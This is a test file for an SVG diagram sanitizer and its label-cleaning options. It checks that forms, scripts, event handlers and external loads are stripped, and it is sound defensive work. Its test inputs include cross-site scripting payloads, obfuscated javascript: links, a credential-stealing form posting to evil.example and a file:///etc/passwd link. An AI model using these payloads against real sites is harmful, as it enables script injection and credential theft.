import { describe, expect, it } from 'vitest'
import { LABEL_PURIFY_CONFIG, toSafeDrawing } from './diagram-safety'

/** Interactive or embedding elements that must never survive inside a drawing. */
const FORBIDDEN_ELEMENTS = [
  'form',
  'input',
  'button',
  'textarea',
  'select',
  'option',
  'label',
  'a',
  'img',
  'iframe',
  'video',
  'audio',
  'object',
  'embed',
  'script',
  'link',
  'meta',
  'base',
  'details',
  'dialog',
]

/** What the library writes for one flowchart node: an HTML label inside a `foreignObject`, with layout styles of its own. */
const NODE_LABEL =
  '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center;"><span class="nodeLabel"><p>Plain label</p></span></div></foreignObject>'

function svgOf(inner: string, attributes = 'viewBox="0 0 100 50"'): string {
  return `<svg xmlns="http://www.w3.org/2000/svg" ${attributes}>${inner}</svg>`
}

function drawn(markup: string): SVGSVGElement {
  const drawing = toSafeDrawing(markup)
  expect(drawing).not.toBeNull()
  return drawing as SVGSVGElement
}

/** A label in which an author put a live form with every kind of control, an external action, styles and a link. */
const HOSTILE_LABEL = [
  '<form action="https://evil.example/steal" method="post" style="position:fixed;inset:0;background:white">',
  '<input name="p" type="password"><button formaction="https://evil.example/x">Go</button>',
  '<textarea>t</textarea><select><option>1</option></select><label for="p">l</label>',
  '<img src="https://evil.example/pixel.png" onerror="alert(1)">',
  '</form>',
  '<a href="https://evil.example" style="color:red">link</a>',
  '<iframe src="https://evil.example"></iframe><video src="x"></video><details open><summary>d</summary></details>',
  '<b>bold</b> and <i>italic</i>',
].join('')

describe('toSafeDrawing: what a drawing keeps', () => {
  it('keeps the shapes, the style sheet, the arrow markers and the label of a node as the library wrote them', () => {
    const drawing = drawn(
      svgOf(
        `<style>#d1 .node rect{fill:#ececff;stroke:#9370db}</style>` +
          `<defs><marker id="d1-end" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M 0 0 L 10 5 L 0 10 z" class="arrowMarkerPath"></path></marker></defs>` +
          `<g class="node default" id="d1-A" data-look="neo" transform="translate(50, 25)"><rect class="basic label-container" style="fill:#f9f !important;stroke:#333 !important;stroke-width:4px" x="-40" y="-12" width="80" height="24" rx="5" ry="5"></rect>` +
          `<g class="label" transform="translate(-35, -12)">${NODE_LABEL}</g></g>` +
          `<path d="M0 0L10 10" marker-end="url(#d1-end)" stroke="#333" fill="none" data-edge="true"></path>` +
          `<text x="4" y="8" dy="1em" text-anchor="middle" style="font-weight: bold; font-size: 14px"><tspan x="4" dy="1em">caption</tspan></text>`,
        'id="d1" role="graphics-document document" aria-roledescription="flowchart-v2" viewBox="0 0 100 50" style="max-width: 100px;"',
      ),
    )

    expect(drawing.getAttribute('viewBox')).toBe('0 0 100 50')
    expect(drawing.getAttribute('aria-roledescription')).toBe('flowchart-v2')
    expect(drawing.querySelector('style')!.textContent).toContain('#d1 .node rect{fill:#ececff;stroke:#9370db}')
    expect(drawing.querySelector('marker')!.getAttribute('orient')).toBe('auto')
    expect(drawing.querySelector('path[marker-end]')!.getAttribute('marker-end')).toBe('url(#d1-end)')
    expect(drawing.querySelector('g.node')!.getAttribute('data-look')).toBe('neo')
    expect(drawing.querySelector('rect')!.getAttribute('style')).toContain('fill:#f9f !important')
    expect(drawing.querySelector('rect')!.getAttribute('style')).toContain('stroke-width:4px')
    expect(drawing.querySelector('tspan')!.textContent).toBe('caption')
    const label = drawing.querySelector('foreignObject span.nodeLabel')!
    expect(label.textContent).toBe('Plain label')
    // The layout styles the library gives a label keep it centered and on one line.
    const box = drawing.querySelector('foreignObject div')!
    expect(box.getAttribute('style')).toBe(
      'display: table-cell; white-space: nowrap; line-height: 1.5; max-width: 200px; text-align: center',
    )
  })

  it('keeps the formatting tags of a label and their text', () => {
    const drawing = drawn(
      svgOf(
        '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel"><p><b>b</b><i>i</i><em>e</em><strong>s</strong><code>c</code><br><u>u</u><s>x</s><sub>1</sub><sup>2</sup></p></span></div></foreignObject>',
      ),
    )

    const kept = [...drawing.querySelector('foreignObject')!.querySelectorAll('*')].map((element) => element.localName)
    expect(kept).toEqual(['div', 'span', 'p', 'b', 'i', 'em', 'strong', 'code', 'br', 'u', 's', 'sub', 'sup'])
    expect(drawing.querySelector('foreignObject')!.textContent).toBe('biesc' + 'u' + 'x' + '1' + '2')
  })

  it('keeps a link that the library drew from a click line, to a web address or to a path of the site', () => {
    const drawing = drawn(
      svgOf(
        '<a xlink:href="https://example.com/page"><rect width="1" height="1"></rect></a><a href="/docs/page"><rect width="1" height="1"></rect></a><a href="#node"><rect width="1" height="1"></rect></a>',
      ),
    )

    expect([...drawing.querySelectorAll('a')].map((a) => a.getAttribute('xlink:href') ?? a.getAttribute('href'))).toEqual([
      'https://example.com/page',
      '/docs/page',
      '#node',
    ])
  })

  it('is not a drawing when the markup holds no svg', () => {
    expect(toSafeDrawing('<p>no drawing</p>')).toBeNull()
    expect(toSafeDrawing('')).toBeNull()
  })
})

describe('toSafeDrawing: labels are text with a few formatting tags', () => {
  it('drops every interactive or embedding element of a label and keeps its text', () => {
    const drawing = drawn(
      svgOf(
        `<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; white-space: nowrap;"><span class="nodeLabel"><p>Label text</p>${HOSTILE_LABEL}</span></div></foreignObject>`,
      ),
    )

    for (const tag of FORBIDDEN_ELEMENTS) expect(drawing.querySelector(tag), tag).toBeNull()
    const label = drawing.querySelector('foreignObject')!
    expect(label.textContent).toContain('Label text')
    expect(label.textContent).toContain('bold')
    expect(label.textContent).toContain('italic')
    expect(label.querySelector('b')!.textContent).toBe('bold')
    // The words of the dropped controls stay as plain text, the way a sanitizer unwraps what it does not know.
    expect(label.textContent).toContain('link')
    expect(label.querySelector('script, style')).toBeNull()
  })

  it('drops the attributes of a label that could act: addresses, actions, handlers, ids, names and data', () => {
    const drawing = drawn(
      svgOf(
        '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel" id="x" name="y" data-admin="1" data-theme="dark" onclick="alert(1)" tabindex="0" contenteditable="true" hidden aria-hidden="true" href="https://evil.example" formaction="https://evil.example" action="https://evil.example" src="https://evil.example"><p title="tip" role="button" popover="auto">text</p></span></div></foreignObject>',
      ),
    )

    for (const element of drawing.querySelectorAll('foreignObject *')) {
      expect(
        [...element.attributes].map((attribute) => attribute.name).filter((name) => name !== 'class' && name !== 'xmlns'),
      ).toEqual([])
    }
    expect(drawing.querySelector('foreignObject')!.textContent).toBe('text')
  })

  it('drops the styles of a label that position, paint or load, and keeps the ones that lay it out', () => {
    const drawing = drawn(
      svgOf(
        '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml" style="display: table-cell; position: fixed; inset: 0; z-index: 99999; background: white; white-space: nowrap; text-align: center; background-image: url(https://evil.example/p.png); margin-top: -9999px"><span class="nodeLabel" style="position:absolute;top:0;left:0;width:100vw;height:100vh;color:rgb(255, 0, 0)"><p style="float:left;content:\'x\';animation:spin 1s;transform:scale(40)">text</p><b style="font-weight: bold; color: expression(alert(1)); font-family: a\\;b">b</b></span></div></foreignObject>',
      ),
    )

    const box = drawing.querySelector('foreignObject div')!
    expect(box.getAttribute('style')).toBe('display: table-cell; white-space: nowrap; text-align: center')
    expect(drawing.querySelector('foreignObject span')!.getAttribute('style')).toBe('color:rgb(255, 0, 0)')
    // A label with nothing left to say has no style attribute at all.
    expect(drawing.querySelector('foreignObject p')!.hasAttribute('style')).toBe(false)
    expect(drawing.querySelector('foreignObject b')!.getAttribute('style')).toBe('font-weight: bold')
    for (const property of [
      'position',
      'inset',
      'z-index',
      'background',
      'margin',
      'float',
      'content',
      'animation',
      'transform',
    ]) {
      expect(drawing.querySelector('foreignObject')!.outerHTML, property).not.toContain(property)
    }
  })

  it('does not let a label borrow the classes of the page', () => {
    const drawing = drawn(
      svgOf(
        '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml" class="fixed inset-0 z-50 bg-white"><span class="nodeLabel sr-only fixed"><p class="edgeLabel">text</p></span></div></foreignObject>',
      ),
    )

    expect(drawing.querySelector('foreignObject div')!.hasAttribute('class')).toBe(false)
    expect(drawing.querySelector('foreignObject span')!.getAttribute('class')).toBe('nodeLabel')
    expect(drawing.querySelector('foreignObject p')!.getAttribute('class')).toBe('edgeLabel')
  })

  it('drops a drawing, a script or a stylesheet that a label carries, and everything inside them', () => {
    const drawing = drawn(
      svgOf(
        '<foreignObject width="90" height="24"><div xmlns="http://www.w3.org/1999/xhtml"><span class="nodeLabel">keep<svg><a href="https://evil.example"><text>x</text></a><circle r="999"></circle></svg><math><mi>m</mi></math><style>body{display:none}</style><script>alert(1)</script><noscript>n</noscript><template>t</template></span></div></foreignObject>',
      ),
    )

    const label = drawing.querySelector('foreignObject')!
    expect(label.querySelector('svg, circle, a, math, style, script, noscript, template')).toBeNull()
    expect(label.textContent).toBe('keep')
  })
})

describe('toSafeDrawing: the drawing itself', () => {
  it('drops every element that is not a drawing element, with what is inside it', () => {
    const drawing = drawn(
      svgOf(
        [
          '<script>alert(1)</script>',
          '<iframe src="https://evil.example"></iframe>',
          '<animate attributeName="href" to="javascript:alert(1)"></animate>',
          '<set attributeName="href" to="javascript:alert(1)"></set>',
          '<g><a><animate attributeName="href" values="javascript:alert(1)"></animate><text>x</text></a></g>',
          '<feImage href="https://evil.example/x.svg"></feImage>',
          '<video src="x"></video>',
          '<audio src="x"></audio>',
          '<unknown-element data-x="1">inside</unknown-element>',
          '<rect width="3" height="3"></rect>',
        ].join(''),
      ),
    )

    expect(
      [...drawing.querySelectorAll('*')]
        .map((element) => element.localName)
        .filter((name) => !['rect', 'g', 'a', 'text'].includes(name)),
    ).toEqual([])
    expect(drawing.querySelector('rect')).not.toBeNull()
    expect(drawing.textContent).not.toContain('inside')
  })

  it('drops comments', () => {
    const drawing = drawn(svgOf('<!-- a comment --><rect width="1" height="1"></rect><g><!-- another --></g>'))

    expect(drawing.innerHTML).not.toContain('<!--')
    expect(drawing.querySelector('rect')).not.toBeNull()
  })

  it('drops event handlers, scripting addresses and attributes it does not know', () => {
    const drawing = drawn(
      svgOf(
        '<g onclick="alert(1)" onload="alert(1)" onmouseover="alert(1)" tabindex="0" contenteditable="true" autofocus accesskey="x" popover="auto" slot="x" is="x-y" srcdoc="x" ping="https://evil.example" referrerpolicy="unsafe-url"><rect width="1" height="1" fill="red" onfocus="alert(1)"></rect></g>' +
          '<a href="javascript:alert(1)"><rect width="1" height="1"></rect></a>' +
          '<a xlink:href="  JaVaScRiPt:alert(1)"><rect width="1" height="1"></rect></a>' +
          '<a href="java&#9;script:alert(1)"><rect width="1" height="1"></rect></a>' +
          '<a href="data:text/html,x"><rect width="1" height="1"></rect></a>' +
          '<a href="vbscript:x"><rect width="1" height="1"></rect></a>' +
          '<a href="blob:https://evil.example/x"><rect width="1" height="1"></rect></a>' +
          '<a href="file:///etc/passwd"><rect width="1" height="1"></rect></a>',
      ),
    )

    const names = [...drawing.querySelectorAll('*')].flatMap((element) =>
      [...element.attributes].map((attribute) => attribute.name),
    )
    for (const name of [
      'onclick',
      'onload',
      'onmouseover',
      'onfocus',
      'tabindex',
      'contenteditable',
      'autofocus',
      'accesskey',
      'popover',
      'slot',
      'is',
      'srcdoc',
      'ping',
      'referrerpolicy',
      'href',
      'xlink:href',
    ]) {
      expect(names, name).not.toContain(name)
    }
    expect(drawing.querySelector('g')!.getAttribute('onclick')).toBeNull()
    expect(drawing.querySelector('rect')!.getAttribute('fill')).toBe('red')
  })

  it('lets a use element point inside the drawing only, and an image at the web or the site only', () => {
    const drawing = drawn(
      svgOf(
        '<use href="#symbol-a"></use><use href="https://evil.example/x.svg#a"></use><use xlink:href="data:image/svg+xml,x"></use>' +
          '<image href="https://example.com/a.png" width="5" height="5"></image><image href="data:image/png;base64,AAAA"></image><image href="javascript:x"></image>',
      ),
    )

    expect([...drawing.querySelectorAll('use')].map((use) => use.getAttribute('href') ?? use.getAttribute('xlink:href'))).toEqual(
      ['#symbol-a', null, null],
    )
    expect([...drawing.querySelectorAll('image')].map((image) => image.getAttribute('href'))).toEqual([
      'https://example.com/a.png',
      null,
      null,
    ])
  })

  it('does not fetch anything from another address through a style or a presentation attribute', () => {
    const drawing = drawn(
      svgOf(
        '<style>@import "https://evil.example/x.css";@import url(https://evil.example/y.css);.a{fill:url(https://evil.example/f.svg#a)}.b{fill:url(#local);background:url( "https://evil.example/p.png" )}</style>' +
          '<rect width="1" height="1" fill="url(https://evil.example/f.svg#a)" stroke="url(#ok)" filter="url(//evil.example/f.svg#f)" style="fill:url(https://evil.example/f.svg#a);stroke:red;cursor:url(https://evil.example/c.cur), auto"></rect>',
      ),
    )

    const css = drawing.querySelector('style')!.textContent!
    expect(css).not.toContain('@import')
    expect(css).not.toContain('evil.example')
    expect(css).toContain('url(#local)')
    const rect = drawing.querySelector('rect')!
    expect(rect.getAttribute('fill')).toBeNull()
    expect(rect.getAttribute('filter')).toBeNull()
    expect(rect.getAttribute('stroke')).toBe('url(#ok)')
    expect(rect.getAttribute('style')).toBe('stroke:red')
  })

  it('keeps no style that positions or loads, on the drawing as on the labels', () => {
    const drawing = drawn(
      svgOf(
        '<rect width="1" height="1" style="position:fixed !important;inset:0 !important;background:white !important;z-index:9999;fill:red;stroke-width:2px"></rect>',
        'viewBox="0 0 1 1" style="max-width: 100px; position: fixed; inset: 0"',
      ),
    )

    expect(drawing.querySelector('rect')!.getAttribute('style')).toBe('fill:red; stroke-width:2px')
    // The page adds its own `min-width` to a drawing; nothing the author wrote about position is left.
    expect(drawing.getAttribute('style')).toMatch(/^max-width: 100px;/)
    expect(drawing.getAttribute('style')).not.toMatch(/position|inset/)
  })
})

describe('the options given to the library for its label cleaner', () => {
  it('allows a few formatting tags and no attribute at all', () => {
    expect(LABEL_PURIFY_CONFIG.ALLOWED_TAGS).toEqual(
      expect.arrayContaining(['b', 'i', 'em', 'strong', 'code', 'br', 'span', 'p', 'div']),
    )
    expect(LABEL_PURIFY_CONFIG.ALLOWED_ATTR).toEqual([])
    expect(LABEL_PURIFY_CONFIG.ALLOW_DATA_ATTR).toBe(false)
    expect(LABEL_PURIFY_CONFIG.ALLOW_ARIA_ATTR).toBe(false)
    for (const tag of FORBIDDEN_ELEMENTS.concat(['style', 'svg', 'math', 'foreignObject', 'template', 'noscript'])) {
      expect(LABEL_PURIFY_CONFIG.ALLOWED_TAGS, tag).not.toContain(tag)
    }
  })
})
